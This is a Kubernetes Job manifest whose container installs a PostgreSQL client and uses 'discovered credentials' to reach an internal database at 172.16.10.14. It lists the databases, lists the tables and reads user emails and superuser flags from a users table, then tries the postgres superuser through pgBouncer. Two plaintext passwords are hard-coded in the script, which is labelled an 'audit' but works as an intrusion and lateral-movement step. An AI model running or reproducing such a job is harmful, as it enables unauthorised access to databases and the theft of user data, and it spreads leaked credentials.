apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v6
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client
          
          # Try connecting to dune DB with discovered credentials
          PG_HOST="172.16.10.14"
          PG_PORT="5432"
          PG_USER="duneuser"
          PG_PASS="psJVV0VTF66hHUcH"
          
          echo "=LIST_DBS="
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -l 2>&1
          echo "=END_DBS="
          
          # Try default DB = duneuser
          echo "=USERS_TABLE="
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -d duneuser -c "\dt" 2>&1
          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -d duneuser -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1
          echo "=END_USERS="
          
          # Also try via pgBouncer port 6432 with postgres superuser
          PG_PORT2="6432"
          echo "=SUPER_DATABASES="
          PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p $PG_PORT2 -U postgres -l 2>&1 | grep -v "^-" | head -50
          echo "=END_SUPER_DBS="
          
          echo "SLEEPING..."
          sleep 180